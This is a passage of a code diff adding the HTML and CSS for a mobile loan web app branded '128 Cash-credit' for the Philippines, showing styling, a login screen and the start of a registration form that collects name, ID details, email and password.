@@ -1,0 +1,2802 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>128 Cash-credit | Fast & Safe Loans Philippines</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            --green: #0d7a3e;
+            --green-dark: #06522a;
+            --green-light: #e8f5ed;
+            --bg: #f2faf5;
+            --card: #ffffff;
+            --border: #d0e6d8;
+            --text: #0a2a1a;
+            --text2: #2a5a3a;
+            --text3: #5a8a6a;
+            --shadow: 0 2px 16px rgba(13, 122, 62, 0.10);
+            --shadow-lg: 0 8px 32px rgba(10, 42, 26, 0.12);
+            --radius: 16px;
+            --radius-sm: 10px;
+            --transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            --danger: #b33c3c;
+            --danger-light: #fff5f5;
+            --warning: #e65100;
+            --warning-light: #fff8f0;
+            --blue: #1565c0;
+            --blue-light: #e8f0fb;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            font-size: 14px;
+        }
+
+        #app {
+            width: 100%;
+            max-width: 480px;
+            min-height: 100vh;
+            background: var(--bg);
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .screen {
+            display: none;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+        .screen.active {
+            display: flex;
+        }
+
+        #toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-120px);
+            background: #0a2a1a;
+            color: #fff;
+            padding: 14px 28px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 600;
+            z-index: 9999;
+            transition: transform .45s cubic-bezier(.175, .885, .32, 1.275);
+            white-space: nowrap;
+            pointer-events: none;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
+            letter-spacing: -0.1px;
+        }
+        #toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+        #toast.success {
+            background: #0d7a3e;
+        }
+        #toast.error {
+            background: #b33c3c;
+        }
+        #toast.info {
+            background: #0a2a1a;
+        }
+        #toast.warning {
+            background: #e65100;
+        }
+
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(10, 42, 26, 0.75);
+            backdrop-filter: blur(8px);
+            z-index: 8000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+        .overlay.active {
+            display: flex;
+        }
+        .overlay-card {
+            background: #fff;
+            border-radius: 24px;
+            padding: 32px 24px;
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            box-shadow: 0 24px 64px rgba(0, 0, 0, .18);
+            animation: popIn 0.35s cubic-bezier(.175, .885, .32, 1.275);
+        }
+        @keyframes popIn {
+            from {
+                transform: scale(0.85);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .overlay-card h3 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text);
+            letter-spacing: -0.3px;
+        }
+        .overlay-card p {
+            font-size: 14px;
+            color: var(--text2);
+            margin-bottom: 16px;
+            line-height: 1.6;
+        }
+
+        .auth-wrap {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 32px 24px;
+        }
+        .auth-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+        .auth-logo .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--green);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: -1px;
+        }
+        .auth-logo .logo-text {
+            display: flex;
+            flex-direction: column;
+        }
+        .auth-logo .logo-text strong {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--text);
+            letter-spacing: -0.3px;
+        }
+        .auth-logo .logo-text span {
+            font-size: 12px;
+            color: var(--text3);
+            font-weight: 400;
+        }
+        .auth-title {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: var(--text);
+            letter-spacing: -0.5px;
+        }
+        .auth-sub {
+            font-size: 14px;
+            color: var(--text2);
+            margin-bottom: 32px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text2);
+            margin-bottom: 6px;
+            letter-spacing: .3px;
+        }
+        .form-group label .label-icon {
+            width: 16px;
+            height: 16px;
+            flex-shrink: 0;
+        }
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: inherit;
+            background: #fff;
+            color: var(--text);
+            outline: none;
+            transition: all var(--transition);
+            -webkit-appearance: none;
+            letter-spacing: -0.1px;
+        }
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: var(--green);
+            box-shadow: 0 0 0 4px rgba(13, 122, 62, .10);
+        }
+        .form-group input.input-error {
+            border-color: #e57373;
+            background: #fffafa;
+            box-shadow: 0 0 0 4px rgba(179, 60, 60, .06);
+            animation: shake 0.5s ease;
+        }
+        .form-group input.input-valid {
+            border-color: #66bb6a;
+            background: #fafff9;
+            box-shadow: 0 0 0 4px rgba(13, 122, 62, .06);
+        }
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            15% {
+                transform: translateX(-8px);
+            }
+            30% {
+                transform: translateX(8px);
+            }
+            45% {
+                transform: translateX(-6px);
+            }
+            60% {
+                transform: translateX(6px);
+            }
+            75% {
+                transform: translateX(-3px);
+            }
+            90% {
+                transform: translateX(3px);
+            }
+        }
+        .form-group .input-hint {
+            font-size: 11px;
+            color: var(--text3);
+            margin-top: 5px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            min-height: 18px;
+            transition: color var(--transition);
+        }
+        .form-group .input-hint.error {
+            color: #e57373;
+        }
+        .form-group .input-hint.success {
+            color: #43a047;
+        }
+        .form-group .pw-wrap {
+            position: relative;
+        }
+        .form-group .pw-wrap input {
+            padding-right: 52px;
+        }
+        .form-group .pw-toggle {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #f5f7f5;
+            border: 1.5px solid var(--border);
+            cursor: pointer;
+            color: var(--text3);
+            font-size: 13px;
+            padding: 6px 10px;
+            border-radius: 8px;
+            transition: all var(--transition);
+            font-weight: 600;
+            font-family: inherit;
+            letter-spacing: -0.1px;
+        }
+        .form-group .pw-toggle:hover {
+            background: #e8f5ed;
+            border-color: var(--green);
+            color: var(--green-dark);
+        }
+        .form-group .pw-toggle:active {
+            transform: translateY(-50%) scale(.94);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: var(--green);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all var(--transition);
+            margin-top: 8px;
+            font-family: inherit;
+            letter-spacing: -0.2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            z-index: 10;
+            overflow: hidden;
+        }
+        .btn-primary:active {
+            transform: scale(.97);
+            background: var(--green-dark);
+        }
+        .btn-primary:disabled {
+            opacity: .55;
+            cursor: not-allowed;
+            transform: none;
+            background: #8bbf9e;
+        }
+        .btn-primary .btn-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2.5px solid rgba(255, 255, 255, .35);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin .7s linear infinite;
+        }
+        .btn-primary.loading .btn-spinner {
+            display: block;
+        }
+        .btn-primary.loading .btn-text {
+            display: none;
+        }
+        .btn-primary.loading .btn-arrow {
+            display: none;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .btn-primary .btn-arrow {
+            display: inline-block;
+            transition: transform var(--transition);
+            font-size: 18px;
+        }
+        .btn-primary:active:not(:disabled) .btn-arrow {
+            transform: translateX(4px);
+        }
+        .btn-primary.pulse {
+            animation: btnPulse 2s infinite;
+        }
+        @keyframes btnPulse {
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(13, 122, 62, .4);
+            }
+            50% {
+                box-shadow: 0 0 0 14px rgba(13, 122, 62, 0);
+            }
+        }
+        .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #fff;
+            color: var(--text);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition);
+            margin-top: 8px;
+            font-family: inherit;
+            letter-spacing: -0.1px;
+        }
+        .btn-secondary:active {
+            transform: scale(.97);
+            border-color: var(--text3);
+            background: #f9fbf9;
+        }
+        .auth-switch {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: var(--text2);
+        }
+        .auth-switch a {
+            color: var(--green-dark);
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: color var(--transition);
+        }
+        .auth-switch a:hover {
+            color: var(--green);
+        }
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .dash-header {
+            background: #fff;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .dash-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .dash-logo .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: var(--green);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: -1px;
+        }
+        .dash-logo strong {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text);
+            letter-spacing: -0.3px;
+        }
+        .btn-logout {
+            background: none;
+            border: 1.5px solid var(--border);
+            border-radius: 8px;
+            padding: 7px 14px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            color: var(--text2);
+            font-family: inherit;
+            transition: all var(--transition);
+        }
+        .btn-logout:hover {
+            border-color: #b33c3c;
+            color: #b33c3c;
+        }
+
+        .balance-card {
+            background: linear-gradient(135deg, #0d7a3e 0%, #06522a 100%);
+            margin: 20px;
+            border-radius: 20px;
+            padding: 24px;
+            color: #fff;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(13, 122, 62, 0.25);
+        }
+        .balance-card::before {
+            content: '';
+            position: absolute;
+            top: -40px;
+            right: -40px;
+            width: 160px;
+            height: 160px;
+            background: rgba(255, 255, 255, .06);
+            border-radius: 50%;
+        }
+        .balance-card::after {
+            content: '';
+            position: absolute;
+            bottom: -60px;
+            left: -20px;
+            width: 200px;
+            height: 200px;
+            background: rgba(255, 255, 255, .04);
+            border-radius: 50%;
+        }
+        .balance-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, .7);
+            letter-spacing: .8px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        .balance-amount {
+            font-size: 36px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 4px;
+            line-height: 1.2;
+            letter-spacing: -1px;
+        }
+        .balance-amount .currency {
+            font-size: 22px;
+            font-weight: 600;
+            vertical-align: super;
+            margin-right: 2px;
+        }
+        .balance-card-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 16px;
+        }
+        .status-badge {
+            padding: 6px 14px;
+            border-radius: 50px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: .5px;
+            text-transform: uppercase;
+        }
+        .badge-none {
+            background: rgba(255, 255, 255, .15);
+            color: rgba(255, 255, 255, .8);
+        }
+        .badge-pending {
+            background: rgba(255, 165, 0, .25);
+            color: #ffcc80;
+        }
+        .badge-approved {
+            background: rgba(13, 122, 62, .35);
+            color: #a5d6a7;
+        }
+        .badge-rejected {
+            background: rgba(179, 60, 60, .25);
+            color: #ef9a9a;
+        }
+        .badge-waiting {
+            background: rgba(255, 165, 0, .25);
+            color: #ffcc80;
+        }
+        .loan-type {
+            font-size: 12px;
+            color: rgba(255, 255, 255, .6);
+            font-weight: 500;
+        }
+
+        .tab-bar {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            background: #fff;
+            border-top: 1px solid var(--border);
+            display: flex;
+            z-index: 200;
+            padding-bottom: env(safe-area-inset-bottom);
+            box-shadow: 0 -4px 16px rgba(10, 42, 26, 0.06);
+        }
+        .tab-item {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px 4px 8px;
+            cursor: pointer !important;
+            transition: color var(--transition);
+            border: none;
+            background: none;
+            font-family: inherit;
+            color: var(--text3);
+            pointer-events: auto !important;
+            gap: 3px;
+        }
+        .tab-item.active {
+            color: var(--green-dark);
+        }
+        .tab-item .tab-icon {
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .tab-item .tab-icon svg {
+            width: 22px;
+            height: 22px;
+            stroke: currentColor;
+        }
+        .tab-item .tab-label {
+            font-size: 10px;
+            font-weight: 600;
+            letter-spacing: .3px;
+        }
+
+        .tab-panel {
+            display: none;
+            padding: 0 0 100px;
+        }
+        .tab-panel.active {
+            display: block;
+        }
+
+        .section-card {
+            background: #fff;
+            margin: 0 20px 16px;
+            border-radius: var(--radius);
+            padding: 20px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border);
+        }
+        .section-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text);
+            letter-spacing: -0.2px;
+        }
+        .section-title .icon {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .section-title .icon svg {
+            width: 18px;
+            height: 18px;
+            stroke: var(--green-dark);
+        }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 0 20px 16px;
+        }
+        .stat-card {
+            background: #fff;
+            border-radius: 14px;
+            padding: 16px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border);
+            transition: all var(--transition);
+            cursor: pointer !important;
+            pointer-events: auto !important;
+        }
+        .stat-card:active {
+            transform: scale(.97);
+            box-shadow: var(--shadow-lg);
+        }
+        .stat-card .s-label {
+            font-size: 11px;
+            color: var(--text3);
+            font-weight: 600;
+            letter-spacing: .4px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+        .stat-card .s-value {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--text);
+            letter-spacing: -0.3px;
+        }
+        .stat-card .s-value.green {
+            color: var(--green-dark);
+        }
+        .stat-card .s-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+        }
+        .stat-card .s-icon svg {
+            width: 16px;
+            height: 16px;
+        }
+        .icon-loan {
+            background: #e8f5ed;
+            color: var(--green-dark);
+        }
+        .icon-withdraw {
+            background: #fff3e0;
+            color: #e65100;
+        }
+        .icon-id {
+            background: #e3f2fd;
+            color: #1565c0;
+        }
+
+        .loan-form-wrap {
+            padding: 0 20px;
+        }
+        .loan-form-wrap .form-group {
+            margin-bottom: 14px;
+        }
+        .loan-form-wrap .form-group input,
+        .loan-form-wrap .form-group select {
+            padding: 12px 14px;
+            font-size: 14px;
+        }
+
+        /* Bank Grid - Enhanced */
+        .bank-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 14px;
+        }
+        .bank-card {
+            background: #fff;
+            border: 2px solid var(--border);
+            border-radius: 14px;
+            padding: 12px 6px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer !important;
+            transition: all .2s ease;
+            pointer-events: auto !important;
+            text-align: center;
+            position: relative;
+        }
+        .bank-card:active {
+            transform: scale(.94);
+        }
+        .bank-card.selected {
+            border-color: var(--green);
+            background: var(--green-light);
+            box-shadow: 0 0 0 3px rgba(13, 122, 62, 0.12);
+            animation: selectPop .3s ease;
+        }
+        @keyframes selectPop {
+            0% {
+                transform: scale(1);
+            }
+            40% {
+                transform: scale(1.06);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        .bank-card.selected::after {
+            content: '✓';
+            position: absolute;
+            top: -6px;
+            right: -6px;
+            width: 22px;
+            height: 22px;
+            background: var(--green);
+            color: #fff;
+            border-radius: 50%;
+            font-size: 11px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 6px rgba(13, 122, 62, .3);
+        }
+        .bank-card .bank-dot {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: -0.5px;
+            flex-shrink: 0;
+            transition: transform .2s ease;
+        }
+        .bank-card.selected .bank-dot {
+            transform: scale(1.08);
+        }
+        .bank-card .bank-name {
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--text2);
+            text-align: center;
+            line-height: 1.2;
+            letter-spacing: -0.1px;
+        }
+        .bank-card.selected .bank-name {
+            color: var(--green-dark);
+        }
+
+        /* Quick Amounts - Enhanced */
+        .quick-amounts {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        .quick-amt-btn {
+            padding: 10px 16px;
+            background: #fff;
+            border: 2px solid var(--border);
+            border-radius: 25px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            color: var(--text2);
+            font-family: inherit;
+            transition: all .2s ease;
+            white-space: nowrap;
+            letter-spacing: -0.2px;
+        }
+        .quick-amt-btn:active {
+            transform: scale(.94);
+        }
+        .quick-amt-btn.active-amount {
+            background: var(--green-light);
+            border-color: var(--green);
+            color: var(--green-dark);
+            font-weight: 700;
+            box-shadow: 0 0 0 3px rgba(13, 122, 62, .08);
+        }
+
+        /* Withdraw Summary */
+        .withdraw-summary {
+            background: #f9fbf9;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 14px;
+            border: 2px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all var(--transition);
+        }
+        .withdraw-summary.highlight {
+            border-color: var(--green);
+            background: var(--green-light);
+            box-shadow: 0 0 0 3px rgba(13, 122, 62, .06);
+        }
+        .withdraw-summary .ws-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            font-weight: 800;
+            color: #fff;
+            flex-shrink: 0;
+            letter-spacing: -0.5px;
+            transition: transform .2s ease;
+        }
+        .withdraw-summary .ws-details {
+            flex: 1;
+            min-width: 0;
+        }
+        .withdraw-summary .ws-bank {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text);
+            letter-spacing: -0.2px;
+        }
+        .withdraw-summary .ws-sub {
+            font-size: 11px;
+            color: var(--text3);
+            font-weight: 500;
+        }
+
+        /* Review Card */
+        .review-card {
+            background: #fff;
+            border: 2px solid var(--border);
+            border-radius: 14px;
+            padding: 18px;
+            margin-bottom: 14px;
+            box-shadow: var(--shadow);
+        }
+        .review-card .review-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f4f0;
+        }
+        .review-card .review-row:last-child {
+            border-bottom: none;
+            padding-bottom: 0;
+            margin-top: 4px;
+        }
+        .review-card .review-row:first-child {
+            padding-top: 0;
+        }
+        .review-card .r-label {
+            font-size: 12px;
+            color: var(--text3);
+            font-weight: 500;
+        }
+        .review-card .r-value {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text);
+            text-align: right;
+            word-break: break-all;
+        }
+        .review-card .r-value.highlight {
+            color: var(--green-dark);
+            font-size: 16px;
+        }
+
+        .profile-header {
+            background: linear-gradient(135deg, var(--green) 0%, var(--green-dark) 100%);
+            margin: 20px;
+            border-radius: 20px;
+            padding: 24px;
+            text-align: center;
+        }
+        .profile-avatar {
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 255, 255, .2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            border: 3px solid rgba(255, 255, 255, .3);
+        }
+        .profile-avatar svg {
+            width: 36px;
+            height: 36px;
+            stroke: #fff;
+        }
+        .profile-name {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: -0.3px;
+        }
+        .profile-email {
+            font-size: 13px;
+            color: rgba(255, 255, 255, .7);
+            margin-top: 4px;
+        }
+        .profile-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin: 16px 20px 0;
+        }
+        .profile-stat {
+            background: #fff;
+            border-radius: 12px;
+            padding: 12px 8px;
+            text-align: center;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border);
+        }
+        .profile-stat .ps-value {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--text);
+            letter-spacing: -0.3px;
+        }
+        .profile-stat .ps-label {
+            font-size: 10px;
+            color: var(--text3);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: .3px;
+        }
+        .profile-stat .ps-value.green {
+            color: var(--green-dark);
+        }
+        .profile-list {
+            background: #fff;
+            margin: 16px 20px;
+            border-radius: var(--radius);
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border);
+        }
+        .profile-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 18px;
+            border-bottom: 1px solid var(--border);
+        }
+        .profile-item:last-child {
+            border-bottom: none;
+        }
+        .profile-item .p-label {
+            font-size: 13px;
+            color: var(--text3);
+            font-weight: 500;
+        }
+        .profile-item .p-value {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text);
+        }
+        .profile-item .p-value.green {
+            color: var(--green-dark);
+        }
+        .profile-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 0 20px 16px;
+        }
+        .profile-actions .action-btn {
+            background: #fff;
+            border: 1.5px solid var(--border);
+            border-radius: 12px;
+            padding: 14px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text2);
+            cursor: pointer;
+            transition: all var(--transition);
+            font-family: inherit;
+            letter-spacing: -0.1px;
+        }
+        .profile-actions .action-btn:active {
+            transform: scale(.96);
+        }
+        .profile-actions .action-btn.danger {
+            border-color: #b33c3c;
+            color: #b33c3c;
+        }
+        .profile-actions .action-btn.primary {
+            border-color: var(--green);
+            color: var(--green-dark);
+        }
+
+        .modal-backdrop {
+            position: fixed;
+            inset: 0;
+            background: rgba(10, 42, 26, 0.8);
+            z-index: 9000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal-backdrop.active {
+            display: flex;
+        }
+        .modal-box {
+            background: #fff;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 360px;
+            overflow: hidden;
+            position: relative;
+        }
+        .modal-head {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .modal-head h4 {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text);
+        }
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--text3);
+            line-height: 1;
+        }
+        .modal-body img {
+            width: 100%;
+            display: block;
+        }
+
+        input[type=number]::-webkit-inner-spin-button,
+        input[type=number]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+        select option {
+            color: #0a2a1a;
+        }
+        .verified-strip {
+            background: #e8f5ed;
+            border: 1px solid #a5d6a7;
+            border-radius: 10px;
+            padding: 10px 14px;
+            margin: 0 20px 12px;
+            font-size: 13px;
+            color: #0d7a3e;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: -0.1px;
+        }
+        .code-input {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 16px 0;
+        }
+        .code-input input {
+            width: 46px;
+            height: 54px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            outline: none;
+            transition: all var(--transition);
+            font-family: inherit;
+        }
+        .code-input input:focus {
+            border-color: var(--green);
+            box-shadow: 0 0 0 4px rgba(13, 122, 62, .10);
+        }
+
+        .timer-display {
+            font-size: 42px;
+            font-weight: 800;
+            color: var(--text);
+            letter-spacing: 2px;
+            margin: 8px 0;
+            font-variant-numeric: tabular-nums;
+        }
+        .timer-display .unit {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text3);
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: var(--text3);
+            margin-top: 4px;
+        }
+
+        .section-label {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text2);
+            margin: 0 20px 10px;
+            letter-spacing: .5px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn-clickable {
+            cursor: pointer !important;
+            position: relative;
+            z-index: 10;
+        }
+        .btn-clickable:active {
+            transform: scale(0.97);
+        }
+
+        #loan-btn,
+        #wd-btn,
+        #register-btn,
+        #login-btn {
+            cursor: pointer !important;
+            position: relative;
+            z-index: 10;
+            pointer-events: auto !important;
+        }
+
+        .bank-card {
+            cursor: pointer !important;
+            pointer-events: auto !important;
+        }
+
+        .tab-item {
+            cursor: pointer !important;
+            pointer-events: auto !important;
+        }
+
+        .stat-card[onclick] {
+            cursor: pointer !important;
+            pointer-events: auto !important;
+        }
+
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #0d7a3e;
+            display: inline-block;
+            animation: pulse-dot 2s infinite;
+            margin-right: 6px;
+        }
+
+        /* E-wallet badge */
+        .ewallet-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 6px;
+            font-size: 9px;
+            font-weight: 700;
+            letter-spacing: .4px;
+            text-transform: uppercase;
+            background: #e8f0fb;
+            color: #1565c0;
+            margin-left: 6px;
+            vertical-align: middle;
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+
+        <div id="toast"></div>
+
+        <!-- LOGIN SCREEN -->
+        <div id="screen-login" class="screen active">
+            <div class="auth-wrap">
+                <div class="auth-logo">
+                    <div class="logo-icon">₱</div>
+                    <div class="logo-text">
+                        <strong>128 Cash-credit</strong>
+                        <span>Philippines · Trusted Since 2020</span>
+                    </div>
+                </div>
+                <h1 class="auth-title">Welcome Back</h1>
+                <p class="auth-sub">Sign in to your account to continue</p>
+                <form id="login-form" autocomplete="off">
+                    <div class="form-group">
+                        <label for="login-email">Email Address</label>
+                        <input type="email" id="login-email" placeholder="Enter your email" autocomplete="new-password" inputmode="email">
+                    </div>
+                    <div class="form-group">
+                        <label for="login-password">Password</label>
+                        <div class="pw-wrap">
+                            <input type="password" id="login-password" placeholder="Enter your password" autocomplete="new-password">
+                            <button type="button" class="pw-toggle" onclick="togglePw('login-password',this)">Show</button>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn-primary btn-clickable" id="login-btn"><span class="btn-text">Sign In</span><span class="btn-arrow">→</span><span class="btn-spinner"></span></button>
+                </form>
+                <p class="auth-switch">Don't have an account? <a onclick="showScreen('screen-register')">Create Account</a></p>
+            </div>
+        </div>
+
+        <!-- REGISTER SCREEN -->
+        <div id="screen-register" class="screen">
+            <div class="auth-wrap" style="padding-top:20px;">
+                <div class="auth-logo">
+                    <div class="logo-icon">₱</div>
+                    <div class="logo-text">
+                        <strong>128 Cash-credit</strong>
+                        <span>Philippines</span>
+                    </div>
+                </div>
+                <h1 class="auth-title">Create Account</h1>
+                <p class="auth-sub">Fill in your details to get started</p>
+                <form id="register-form" autocomplete="off">
+                    <div class="form-group">
+                        <label>Full Name</label>
+                        <input type="text" id="reg-fullname" placeholder="Enter your full name" autocomplete="off">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>ID Name</label>
+                            <input type="text" id="reg-idname" placeholder="Name on ID" autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label>ID Card Number</label>
+                            <input type="text" id="reg-idnumber" placeholder="ID Number" autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Email Address</label>
+                        <input type="email" id="reg-email" placeholder="Enter email" autocomplete="off" inputmode="email">
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <div class="pw-wrap">
+                            <input type="password" id="reg-password" placeholder="Min. 6 characters" autocomplete="new-password">
+                            <button type="button" class="pw-toggle" onclick="togglePw('reg-password',this)">Show</button>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Confirm Password</label>
+                        <div class="pw-wrap">
